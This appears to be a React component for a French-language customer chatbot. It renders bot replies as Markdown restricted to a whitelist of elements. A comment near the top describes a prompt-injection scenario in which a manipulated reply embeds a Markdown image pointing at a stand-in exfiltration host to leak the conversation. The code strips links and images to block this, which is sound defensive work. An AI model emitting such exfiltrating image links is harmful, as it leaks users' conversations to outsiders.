// src/components/Chatbot.tsx
import React, { useState, useEffect, useRef } from "react"; // 1. Import useEffect & useRef
import { Send, MessageCircle, Loader2 } from "lucide-react";
import { askChatbot } from "../utils/chatbotApi";
import ReactMarkdown from 'react-markdown';

/**
 * Le rendu Markdown échappe déjà le HTML brut (pas de rehype-raw), mais il
 * affiche liens et images. Une réponse manipulée par injection de prompt
 * pourrait émettre ![](https://exfil.example/?d=...) et faire fuiter le contenu
 * de la conversation au simple affichage. On neutralise donc les URLs distantes.
 */
const allowedElements = [
  'p', 'br', 'strong', 'em', 'del', 'code', 'pre',
  'ul', 'ol', 'li', 'blockquote',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr',
];

interface Message {
  id: number;
  sender: "user" | "bot";
  text: string;
}

const Chatbot: React.FC = () => {
  const [open, setOpen] = useState(false);
  const [messages, setMessages] = useState<Message[]>([]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // 2. Create a reference for the bottom of the chat
  const messagesEndRef = useRef<HTMLDivElement>(null);

  // 3. Automatically scroll to bottom whenever 'messages' or 'loading' changes
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, loading]);

  const handleSend = async () => {
    if (!input.trim() || loading) return;

    const userMessage: Message = { id: Date.now(), sender: "user", text: input };
    setMessages(prev => [...prev, userMessage]);
    setInput("");
    setLoading(true);
    setError(null);

    try {
      const botResponse = await askChatbot(userMessage.text);
      const botMessage: Message = {
        id: Date.now() + 1,
        sender: "bot",
        text: botResponse
      };
      setMessages(prev => [...prev, botMessage]);
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : "Une erreur est survenue";
      setError(errorMessage);
      const botMessage: Message = {
        id: Date.now() + 1,
        sender: "bot",
        text: `❌ ${errorMessage}`
      };
      setMessages(prev => [...prev, botMessage]);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <button
        onClick={() => setOpen(!open)}
        className="fixed bottom-6 right-6 bg-blue-500 text-white p-4 rounded-full shadow-lg hover:bg-blue-600 transition z-50"
        aria-label="Ouvrir le chatbot"
      >
        <MessageCircle className="w-6 h-6" />
      </button>

      {open && (
        <div className="fixed bottom-20 right-6 w-96 h-[500px] bg-white border border-gray-300 rounded-lg shadow-xl flex flex-col z-50 overflow-hidden">
          <div className="flex-none flex justify-between items-center bg-blue-500 text-white px-4 py-3">
            <span className="font-semibold">Cdc Smart Bot </span>
            <button onClick={() => setOpen(false)} className="hover:bg-blue-600 rounded px-2">✕</button>
          </div>

          {/* Chat Messages Area */}
          <div className="flex-1 p-4 overflow-y-auto space-y-3 bg-gray-50">
            {messages.length === 0 && (
              <div className="text-center text-gray-500 mt-8">
                <MessageCircle className="w-12 h-12 mx-auto mb-2 text-gray-400" />
                <p className="text-sm">Posez-moi des questions sur CDC !</p>
              </div>
            )}

            {messages.map(msg => (
              <div
                key={msg.id}
                className={`flex ${msg.sender === "user" ? "justify-end" : "justify-start"}`}
              >
                <div
                  className={`p-3 rounded-lg max-w-[80%] ${
                    msg.sender === "user"
                      ? "bg-blue-500 text-white rounded-br-none"
                      : "bg-white border border-gray-200 text-gray-800 rounded-bl-none shadow-sm"
                  }`}
                >
                  <div className={`text-sm ${msg.sender === "user" ? "text-white" : "text-gray-800"}`}>
                    <ReactMarkdown
                      allowedElements={allowedElements}
                      unwrapDisallowed
                    >{msg.text}</ReactMarkdown>
                  </div>
                </div>
              </div>
            ))}

            {loading && (
              <div className="flex justify-start">
                <div className="bg-white border border-gray-200 p-3 rounded-lg rounded-bl-none shadow-sm">
                  <div className="flex items-center space-x-2 text-gray-500">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span className="text-sm">Le bot réfléchit...</span>
                  </div>
                </div>
              </div>
            )}
            
            {/* 4. Invisible div that the view scrolls to */}
            <div ref={messagesEndRef} />
          </div>

          {/* Input Area */}
          <div className="flex border-t border-gray-200 bg-white rounded-b-lg">
            <input
              type="text"
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={e => e.key === "Enter" && !e.shiftKey && handleSend()}
              placeholder="Posez votre question..."
              disabled={loading}
              className="flex-1 p-3 outline-none rounded-bl-lg disabled:bg-gray-50 disabled:text-gray-400"
            />
            <button
              onClick={handleSend}
              disabled={loading || !input.trim()}
              className="px-4 bg-blue-500 text-white hover:bg-blue-600 transition disabled:bg-gray-300 disabled:cursor-not-allowed rounded-br-lg"
              aria-label="Envoyer"
            >
              {loading ? (
                <Loader2 className="w-5 h-5 animate-spin" />
              ) : (
                <Send className="w-5 h-5" />
              )}
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default Chatbot;